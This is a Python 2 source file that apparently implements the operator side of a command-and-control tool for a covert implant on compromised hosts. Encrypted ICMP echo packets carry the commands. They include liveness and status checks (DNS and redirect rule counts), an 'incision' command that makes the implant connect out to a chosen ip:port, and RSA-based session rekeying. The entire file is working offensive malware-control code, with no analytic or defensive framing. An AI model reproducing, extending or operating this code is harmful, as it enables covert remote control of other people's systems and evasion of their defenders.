import base
import icmpecho
import tcpstream
import crypto
import time
import struct
import string
import re
import sha
import hex

class ECHOCMD(base.Command):
    def __init__(self):
        base.Command.__init__(self)
        self.op = 0
        self.res = 0
        self.auth_1 = 0xFFFFFF00L
        self.data = ""

    def run(self):
        if self.implant.protocol.sock != None:
            return None
        else:
            return "Not connected.  Try: %s help connect" % (self.implant.session.name)

    #------------------------------------------------------------------------
    # Name   : Assemble
    # Purpose: Form a packet to be sent to the implant
    # Receive: << nothing >>
    # Return : << nothing >>
    #------------------------------------------------------------------------
    def Assemble(self):
        # Find the current time
        currTime = time.time();
        curr_time_sec = int(currTime)

        # Pack the data structure
        self.cmddata = struct.pack("!HH", 0, self.op)
        self.cmddata = self.cmddata + struct.pack("!L",curr_time_sec + \
                                                  self.implant.timediff)
        self.cmddata = self.cmddata + self.data
        # Add extra chars at the end to fill packet to correct size
        for i in range(self.implant.packetSize - len(self.cmddata) - 28):
            self.cmddata = self.cmddata + '\000'
            
        # Add some padding for RC6
        if self.implant.cipher.num == 2:
            self.cmddata = '\000\000\000\000\000\000\000\000' + self.cmddata

    #------------------------------------------------------------------------
    # Name   : Disassemble
    # Purpose: Process a packet received from the implant
    # Receive: data - The raw packet data
    # Return : << nothing >>
    #------------------------------------------------------------------------
    def Disassemble(self,data):
        # Remove the padding for RC6
        if self.implant.cipher.num == 2:
            data = data[8:]
        
        self.op = struct.unpack("!H",data[2:4])[0]
        self.res = struct.unpack("!H",data[0:2])[0]
        # Check for ALIVE bit in the return
        if (self.res & 0x8000L):
            self.res = self.res & 0x7fL
        else:
            print "Alive bit not set in return packet"
        self.ts = struct.unpack("!L",data[4:8])[0]
        self.data = data[8:]
        
    #------------------------------------------------------------------------
    # Name   : Query
    # Purpose: Encrypt and send a query to an implant, then decrypt the resp.
    # Receive: << nothing >>
    # Return : << nothing >>
    #------------------------------------------------------------------------
    def Query(self):
        """ Will return result """
        self.Assemble()
        # Setup the protocol
        self.protocol = self.implant.protocol
        self.protocol.SetDestination(self.implant.session.target.ip)
            
        # for i=0 to max_retries
        for i in range(2):
            try:
                # Send the packet
                self.protocol.SendTo(self.cmddata)
            
                # Get the response
                myData = self.protocol.RecvFrom()
                if( myData != None and myData != ""):
                    self.Disassemble(myData)
                    break
            except:
                print "Retrying"
                continue


    #------------------------------------------------------------------------
    # Name   : ConvertIP
    # Purpose: Convert an IP address to decimal form
    # Receive: ip - The ip address to convert
    # Return : the IP address in network byte order
    #------------------------------------------------------------------------
    def ConvertIP(self,ip):
        #regLine = regex.compile('^\([\\][0-3]?[0-7]?[0-7]\)*$')
        #regS = regex.compile('\([\\][0-3]?[0-7]?[0-7]\)')
        if( type(ip) == type('') ):
            #if regLine.match(ip) == 0:
            #    pos = 0
            #    ipStr = ''
            #    while pos < len(ip):
            #        Cs = regS.search(ip,pos)
            #        Cl = regS.match(ip,pos)
            #        pos = Cs+Cl
            #        ipStr = ipStr + eval("'"+ip[Cs:pos]+"'")
            #else:
                ipParts = string.splitfields(ip,'.')
                if len(ipParts) == 4:
                    ipStr = chr(eval(ipParts[0]))
                    ipStr = ipStr+chr(eval(ipParts[1]))
                    ipStr = ipStr+chr(eval(ipParts[2]))
                    ipStr = ipStr+chr(eval(ipParts[3]))
                else:
                    #ipStr = ip
                    raise ValueError, ip
        else:
            ipStr = struct.pack("!L",ip)
        return ipStr
    
    def ConvertToDot(self, ip):
        if type(ip) == type('a'):
            ip = struct.unpack("!L",ip)[0]
        return "%d.%d.%d.%d" % ((int)(ip / 16777216) & 0xFFL,\
                                (int)(ip / 65536) & 0xFFL,\
                                (int)(ip / 256) & 0xFFL,\
                                ip & 0xFFL)

    def ConvertTime(self, time):
        if type(time) == type(3600):
            return time
        #x = regex.compile("^\([-]\)?\(\([0-9]*\)D\)?\(\([0-9]*\)H\)?\(\([0-9]*\)M\)?\(\([0-9]*\)[S]?\)?$")
        regep = re.compile("^([+-]?)(([0-9]+)D)?(([0-9]+)H)?(([0-9]+)M)?(([0-9]+)S?)?$")
        x = regep.match(string.upper(time))
        if x:
            times = [x.group(3), x.group(5), x.group(7), x.group(9)]
            for i in range(4):
                if times[i] == None or times[i] == "":
                    times[i] = "0"
            time = eval(times[0]) * 86400 + eval(times[1]) * 3600 \
                   + eval(times[2]) * 60 + eval(times[3])
            if x.group(1) == "-":
                time = time * -1
            return time
        raise ValueError, time

    def TimeConvert(self,time):
        if type(time) == type("1h"):
            return time
        if time < 1:
            fmtString = "-"
            time = time * -1
        else:
            fmtString = ""
        sec = time % 60
        time = time - sec
        min = time % 3600
        time = time - min
        min = min/60
        hour = time % 86400
        time = time - hour
        hour = hour / 3600
        day = time / 86400
        if day:
            fmtString = fmtString + "%dd" %(day)
        if hour:
            fmtString = fmtString + "%dh" %(hour)
        if min:
            fmtString = fmtString + "%dm" %(min)
        if sec:
            fmtString = fmtString + "%ds" % (sec)
        return fmtString


##########################################################################
# PING class
# op code: 0x00
#########################################################################
class ECHOCMD_PING(ECHOCMD):
    def __init__(self):
        ECHOCMD.__init__(self)
        self.name = "ping"
        self.usage = "ping"
        self.info = "Send an are-you-there ping to the target"
        self.op = 0x00L

    def run(self):
        msg = ECHOCMD.run(self)
        if msg != None:
            return (0,msg)
        
        self.Query()
        if self.op == 0x0L and self.res == 0x01L:
            # Set the timediff
            self.implant.timediff = self.ts - time.time()
            return (1,"implant is alive, setting timediff to %s" %\
                    (self.TimeConvert(self.implant.timediff)))
        else:
            return (0,"implant is NOT alive")


##########################################################################
# STATUS class
# op code: 0x01
#########################################################################
class ECHOCMD_STATUS(ECHOCMD):
    def __init__(self):
        ECHOCMD.__init__(self)
        self.name = "status"
        self.usage = "status"
        self.info = "Find version of the implant, number of fd in use etc.."
        self.op = 0x01L

    def run(self):
        msg = ECHOCMD.run(self)
        if msg != None:
            return (0,msg)
        
        self.Query()
        if self.op == 0x01L and self.res == 0x01L:
            ver = struct.unpack("!H",'\000'+self.data[:1])[0]
            unused = struct.unpack("!H",'\000'+self.data[1:2])[0]
            fd = struct.unpack("!H",self.data[2:4])[0]
            boot_sec = struct.unpack("!L",self.data[4:8])[0]
            dns,redir,conn = struct.unpack("!LLL",self.data[8:20])
            res = "Remote version: %d\n" % ver
            res = res + "Time host was last rebooted: %s\n" % \
                  time.ctime(time.time()-boot_sec + self.implant.timediff)
            res = res + "%d Active DNS rules\n" %(dns)
            res = res + "%d Active redirect rules\n" %(redir)
            res = res + "%d Active connections" %(conn)
            return (1,res)
            
        else:
            return (0,"Status operation failed")



##########################################################################
# INCISION class
# op code: 0x14
##########################################################################
class ECHOCMD_INCISION(ECHOCMD):
    def __init__(self):
        ECHOCMD.__init__(self)
        self.name = "incision"
        self.usage = "incision <ip>:<port>"
        self.info = "Start an incision connection to the specified ip and port"
        self.op = 0x14L

    def parseHostInfo(self,host):
        #split the ip from the ports
        res = string.split(host,":")
        if len(res) == 1:
            raise ValueError, host
        elif len(res) == 2:
            ports = string.split(res[1],"/")
            if len(ports) < 1 or len(ports) > 2:
                raise ValueError, ports
            if ports[0] == "*":
                raise ValueError, ports[0]
            else:
                ports[0] = eval(ports[0])
            try:
                host = None
                ipaddr = self.ConvertIP(res[0])
            except:
                host = base.sessionDict[res[0]]
                ipaddr = self.ConvertIP(host.target.GetIP())
            return host,ipaddr,ports[0]
        else:
            raise ValueError, host

    def run(self,ipport):
        msg = ECHOCMD.run(self)
        if msg != None:
            return (0,msg)
        
        host,ip,port = self.parseHostInfo(ipport)
        if host != None:
            hpn = host.implant.parent.name
            myname = host.name
            cmd = host.GetCommand('rediradd')
            res = cmd.run("tcp",\
                          "%s:%d/%d"%(hpn,port,0),\
                          "%s:%d/%d"%(self.implant.session.target.ip,0,port),\
                          "-afix")
            if cmd.implant.session.target.hasAnotherAddress == 1:
                ip = cmd.redir.ST_ip
        # Change the ip to a decimal number
        self.data = ip + struct.pack("!L",port)
        self.Query()

        # Look at the response
        if (self.op == 0x14L and self.res == 0x1L):
            return (1,"Incision contacted successfully")
        else:
            if( struct.unpack("!L",self.data[0:4])[0] == 0x0106 ):
                return (0,"Incision command not supported")
            elif( struct.unpack("!L", self.data[0:4])[0] == 0x0107 ):
                return (0,"Incision not installed")
            else:
                return (0,"Incision command failed")


##########################################################################
# DONE class
# op code: 0xFF
##########################################################################
class ECHOCMD_DONE(ECHOCMD):
    def __init__(self):
        ECHOCMD.__init__(self)
        self.name = "done"
        self.usage = "done [<num> | all]"
        self.info = "Send a DONE message to reset the connection"
        self.op = 0xFFL

    def run(self,all=None):
        msg = ECHOCMD.run(self)
        
        if self.implant.protocol.sock == None:
            base.sessionDict[self.implant.session.name] = None
            return (1,"all done with " + self.implant.session.name)
        rules = self.implant.rules

        while len(rules):
            i = len(self.implant.rules) - 1
            rules[i].remove()

        if all != None:
            if type(all) != type(1):
                all = string.upper(all)
                if all[0:1] == "A":
                    all = 0
                else:
                    all = 0xFFFFFFFFL
        else:
            all = 0xFFFFFFFFL

        self.data = struct.pack("!L",all)
        self.Query()
        if self.op == 0xFFL and self.res == 0x01L:
            myNum = struct.unpack("!L",self.data[0:4])[0]
        else:
            myNum = 0
        if all == 0 or all == myNum or all == 0xFFFFFFFFL:
            self.implant.protocol.sock.close()
            self.implant.protocol.sock = None
            base.sessionDict[self.implant.session.name] = None
            if self.implant.version >= 2.0:
                if self.implant.session.localRedir != None:
                    self.implant.session.localRedir.remove()
        if myNum == 0:
            return (0,"DONE command failed")
        return (1,"DONE command completed successfully")


##########################################################################
# SWITCHKEY class
# op code: 0x16
##########################################################################
class ECHOCMD_SWITCHKEY(ECHOCMD):
    def __init__(self):
        ECHOCMD.__init__(self)
        self.name = "switchkey"
        self.usage = "switchkey"
        self.info = "Tells the implant to switch keys"
        self.op = 0x16L

    def run(self):
        msg = ECHOCMD.run(self)
        if msg != None:
            return (0,msg)
        
        newCV = self.implant.newCV
        self.Query()
        if self.op == 0x16L and self.res == 0x01L:
            # Change keys
            if newCV != None:
                self.implant.cipher.SetKey((struct.unpack("!L",newCV[0:4])[0],\
                                            struct.unpack("!L",newCV[4:8])[0],\
                                           struct.unpack("!L",newCV[8:12])[0],
                                          struct.unpack("!L",newCV[12:16])[0]))
                self.implant.newCV = None
            else:
                self.implant.cipher.SetKey(self.implant.targetopts['KEY'])
            key = self.implant.cipher.GetKey()
            # Check for RC6
            if self.implant.cipher.num == 2:
                return (1,"SWITCHKEY command completed successfully\nCurrent key is: %s %s %s %s" % (hex.str(key[0]),hex.str(key[1]),hex.str(key[2]),hex.str(key[3])))
            else:
                return (1,"SWITCHKEY command completed successfully\nCurrent key is: %s %s %s" % (hex.str(key[0]),hex.str(key[1]),hex.str(key[2])))
        else:
            return (0,"SWITCHKEY command not received")

##########################################################################
# REKEY class
# op code: 0x17
##########################################################################
class ECHOCMD_REKEY(ECHOCMD):
    def __init__(self):
        ECHOCMD.__init__(self)
        self.name = "rekey"
        self.usage = "rekey"
        self.info = "Initiates a new session key exchange with the implant"
        self.op = 0x17L

    def run(self):
        msg = ECHOCMD.run(self)
        if msg != None:
            return (0,msg)
        
        myRand = ''
        N = self.implant.N
        d = self.implant.d
        Nsign = self.implant.Nsign
        dsign = self.implant.dsign
        highofN  = N >> 992

        # Get the random data
        for i in range(4):
            myRand = myRand + crypto.GetRandom()
        myRand = myRand[0:108]

        # Make sure the data isn't going to be bigger than N
        highofRand = struct.unpack("!L",myRand[104:108])[0]
        if highofRand >= highofN:
            myRand = myRand[0:104] + struct.pack("!L",highofRand - highofN)

        # Compute a hash of the random data
        myHash = sha.new(myRand)
        myHash = myHash.digest()
        #print "hash s:" + \
        #      " " + hex.str(struct.unpack("!L",myHash[0:4])[0]) +\
        #      " " + hex.str(struct.unpack("!L",myHash[4:8])[0]) +\
        #      " " + hex.str(struct.unpack("!L",myHash[8:12])[0]) +\
        #      " " + hex.str(struct.unpack("!L",myHash[12:16])[0]) +\
        #      " " + hex.str(struct.unpack("!L",myHash[16:20])[0])

        # Convert the hash and data into a MP number
        keyData = myHash + myRand
        num = 0L
        for i in range(32):
            num = (num << 32) | struct.unpack("!L",keyData[124-i*4:128-i*4])[0]
        #print "orig (switched) =", hex.str(num)
        
        # RSA
        ct = pow(num,dsign,Nsign)

        # Package the new MP number
        ct2 = 0L
        for i in range(32):
            ct2 = ct2 << 32 | (ct >> 32*i) & 0xffffffffL
        #print "CT =",hex.str(ct)
        #print "CT (switched) =",hex.str(ct2)

        self.data = ''
        for i in range(32):
            self.data = struct.pack("!L", ((ct2>>i*32) & 0xffffffffL)) + self.data
        self.data = '\000\000\000\000' + self.data

        # Send it
        self.Query()
        self.ret = struct.unpack("!L",self.data[0:4])[0]
        if self.op == 0x17L and self.res == 0x01L:
            self.data = self.data[4:]

            # Unwrap the number
            num = 0L
            for i in range(32):
                num = (num << 32) + \
                      struct.unpack("!L",self.data[124-i*4:128-i*4])[0]
                
            # RSA
            pt = pow(num,d,N)

            # Convert the number into the random bits
            for i in range(32):
                keyData = keyData + \
                          struct.pack("!L",((pt >> 32*i)&0xffffffffL))

            #out = ''
            #for i in range(len(keyData)):
            #    out = out + "%02x" % \
            #          ((struct.unpack("!H", '\000' + keyData[i:i+1])[0]) &\
            #           0xff)
            #print "Raw output =",out
            # Form CV
            newCV = sha.new(keyData)
            self.implant.newCV = newCV.digest()
            #out = ''
            #for i in range(len(self.implant.newCV)):
            #    out = out + "%02x" % \
            #          ((struct.unpack("!H", '\000' + self.implant.newCV[i:i+1])[0]) &\
            #           0xff)
            #print "CV output =",out
            
            return (1,"REKEY command completed successfully, now run switchkey")
        elif self.ret == 108:
            return (0, "Incorrect authentication")
        elif self.ret == 109:
            return (0, "Implant not currently on master (original) key")
        else:
            return (0,"REKEY command failed")

##########################################################################
# ORIGKEY class
##########################################################################
class ECHOCMD_ORIGKEY(ECHOCMD):
    def __init__(self):
        ECHOCMD.__init__(self)
        self.name = "origkey"
        self.usage = "origkey"
        self.info = "Sets the session key back to the original key"

    def run(self):
        msg = ECHOCMD.run(self)
        if msg != None:
            return (0,msg)
        
        self.implant.cipher.SetKey(self.implant.targetopts['KEY'])
        return (1,"ORIGKEY command completed successfully")

##########################################################################
# KEY class
##########################################################################
class ECHOCMD_KEY(ECHOCMD):
    def __init__(self):
        ECHOCMD.__init__(self)
        self.name = "key"
        self.usage = "key [cv1 cv2 cv3 [cv4]]"
        self.info = "Display or set the current key"

    def run(self,cv1=0, cv2=0, cv3=0, cv4=0):
        msg = ECHOCMD.run(self)
        #if msg != None:
        #    return (0,msg)
        
        if cv1 == 0 and cv2 == 0 and cv3 == 0:
            key = self.implant.cipher.GetKey()
        else:
            key = (cv1,cv2,cv3,cv4)
            self.implant.cipher.SetKey(key)

        # Display another variable if we're using RC6
        if self.implant.cipher.num == 2:
            return (1,"Current key is: %s %s %s %s" % \
                    (hex.str(key[0]), hex.str(key[1]), hex.str(key[2]),
                     hex.str(key[3])))
        else:
            return (1,"Current key is: %s %s %s" % \
                    (hex.str(key[0]), hex.str(key[1]), hex.str(key[2])))


##########################################################################
# RETRY class
#########################################################################
class ECHOCMD_RETRY(ECHOCMD):
    def __init__(self):
        ECHOCMD.__init__(self)
        self.name = "retries"
        self.usage = "retries [num]"
        self.info = "Get and set the number of retries (see also timeout)"
    def run(self, num=-1):
        msg = ECHOCMD.run(self)
        #if msg != None:
        #    return (0,msg)
        
        if num > -1:
            self.implant.retries = num
            return (1,"Set to %d retries" % num)
        else:
            return (1,"Will try %d times before giving up" % self.implant.retries)

##########################################################################
# SETSIZE class
#########################################################################
class ECHOCMD_SETSIZE(ECHOCMD):
    def __init__(self):
        ECHOCMD.__init__(self)
        self.name = "setsize"
        self.usage = "setsize [CC packet size]"
        self.info = "Get and set the size of the ICMP packet"

    def run(self, size=0):
        msg = ECHOCMD.run(self)
        #if msg != None:
        #    return (0,msg)
        
        if size:
            self.implant.packetSize = size
            return (1,"ICMP packet size is now %d" % size)
        else:
            return (1,"ICMP packet size is %d" % self.implant.packetSize)


##########################################################################
# TIMEOUT class
#########################################################################
class ECHOCMD_TIMEOUT(ECHOCMD):
    def __init__(self):
        ECHOCMD.__init__(self)
        self.name = "timeout"
        self.usage = "timeout [seconds]"
        self.info = "Get and set the timeout (in seconds) to wait for a response"

    def run(self,sec=0):
        msg = ECHOCMD.run(self)
        #if msg != None:
        #    return (0,msg)
        
        if sec:
            self.implant.protocol.timeout = sec
            return (1,"Timeout set to %d seconds" % sec)
        else:
            return (1,"The timeout is set to %d seconds" % self.implant.protocol.timeout)

##########################################################################
# TIMEDIFF class
#########################################################################
class ECHOCMD_TIMEDIFF(ECHOCMD):
    def __init__(self):
        ECHOCMD.__init__(self)
        self.name = "timediff"
        self.usage = "timediff [[-]seconds]"
        self.info = "Get and set time difference (in seconds) between host and target"

    def run(self,sec=-999999):
        msg = ECHOCMD.run(self)
        #if msg != None:
        #    return (0,msg)
        
        if sec != -999999:
            self.implant.timediff = self.ConvertTime(sec)
            return (1,"Timediff set to %s" % self.TimeConvert(sec))
        else:
            return (1,"Timediff is set at %s" % self.TimeConvert(self.implant.timediff))

